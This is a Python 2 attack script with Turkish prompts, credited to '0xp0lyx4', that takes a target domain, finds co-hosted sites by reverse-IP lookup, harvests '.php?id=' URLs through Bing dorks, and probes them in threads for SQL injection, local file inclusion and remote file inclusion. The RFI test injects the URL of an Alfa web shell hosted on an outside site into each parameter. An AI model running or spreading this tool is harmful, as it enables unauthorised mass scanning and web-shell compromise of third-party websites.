#-*- coding:UTF-8 -*-

import requests
import re
import os
import time
import threading
import random

y = "\033[36m"
b = "\033[0m"

hosts = []
urls = []

def rfi():
      for da in urls:
          try:
              dad = re.findall('http(.*?)=',da)
              for yd in dad:
                 r3 = requests.get("http"+yd+"=https://shellx.org/Shell/alfa.txt")
                 if re.search("'usKeCkrvJKxH' => 'admin',", r3.text):
                        print(y+"["+b+"-<<RFI>>-"+y+"] ["+b+time.strftime("%H/%M/%S")+y+"]--> ["+b+da+y+"]")
          except:
                 continue

def lfi():
      for dd in urls:
            try:
                  ddd = re.findall('http(.*?)=', dd)
                  for ads in ddd:
                         r2 = requests.get("http"+ads+"=")
                         if re.search("Warning: include():", r2.text):
                               print(y+"["+b+"-<<LFI>>-"+y+"] ["+b+time.strftime("%H/%M/%S")+y+"]--> ["+b+dd+y+"]")
            except:
                 continue

def sql():
      for ud in urls:
          try:
                 rd = requests.get(ud+"'")
                 if re.search("sql", rd.text) or re.search("SQL", rd.text) or re.search("Sql", rd.text):
                      print(y+"["+b+"-<<SQL>>-"+y+"] ["+b+time.strftime("%H/%M/%S")+y+"]--> ["+b+ud+y+"]") 
          except:
                continue

def ur():
      for hos in hosts:
            try:
               start = 0
               while start <= 200:
                  res = requests.get("http://www.bing.com/search?q=site:"+hos+" .php?id=&count=50&first="+str(start))
                  find2 = re.findall('<h2><a href="(.*?)"',res.text)
                  for url in find2:
                         urls.append(url)
                         print(y+"["+b+"-<<URL>>-"+y+"] ["+b+time.strftime("%H/%M/%S")+y+"] ["+b+hos+y+"]--> ["+b+url+y+"]")
                  start = start + 10
            except:
                  continue
      t1 = threading.Thread(target = sql)
      t2 = threading.Thread(target = lfi)
      t3 = threading.Thread(target = rfi)

      t1.start()
      t2.start()
      t3.start()
def reverse():
   try:
      req = requests.get("https://api.hackertarget.com/reverseiplookup/?q="+hedef)
      if re.search("error check", req.text) or re.search("DNS", req.text):
           hosts.append(hedef)
      else:
        s = req.text
        siteler = s.split()
        for site in siteler:
            if re.search("webmail", site) or re.search("cpanel", site):
                  continue
            elif re.search("www", site):
                  hst = site.split("www.")
                  hosts.append(hst[1])
                  print(y+"["+b+"-<<REVERSE IP>>-"+y+"] ["+b+time.strftime("%H/%M/%S")+y+"]--> ["+b+hst[1]+y+"]")
            else:
                  hst = site
                  hosts.append(hst)
                  print(y+"["+b+"-<<REVERSE IP>>-"+y+"] ["+b+time.strftime("%H/%M/%S")+y+"]--> ["+b+hst+y+"]")

   except:
      print(y+"> "+b+"Hedef sitenizi doğru girdiğinizden emin olunuz!")
      exit()
   ur()

def banner():
     print(y+"""
     
 ██████╗ ██╗  ██╗██████╗  ██████╗ ██╗  ██╗   ██╗██╗  ██╗██╗  ██╗
██╔═████╗╚██╗██╔╝██╔══██╗██╔═████╗██║  ╚██╗ ██╔╝╚██╗██╔╝██║  ██║
██║██╔██║ ╚███╔╝ ██████╔╝██║██╔██║██║   ╚████╔╝  ╚███╔╝ ███████║
████╔╝██║ ██╔██╗ ██╔═══╝ ████╔╝██║██║    ╚██╔╝   ██╔██╗ ╚════██║
╚██████╔╝██╔╝ ██╗██║     ╚██████╔╝███████╗██║   ██╔╝ ██╗     ██║
 ╚═════╝ ╚═╝  ╚═╝╚═╝      ╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝     ╚═╝
                                                                
"""+b+"""
     [ Kodlayan: 0xp0lyx4 && Twitter: @0xp0lyx4 ]

     """)

if __name__=="__main__":
       os.system("clear")
       banner()
       hedef = raw_input(y+"Hedef: "+b)
       os.system("clear")
       banner()
       reverse()
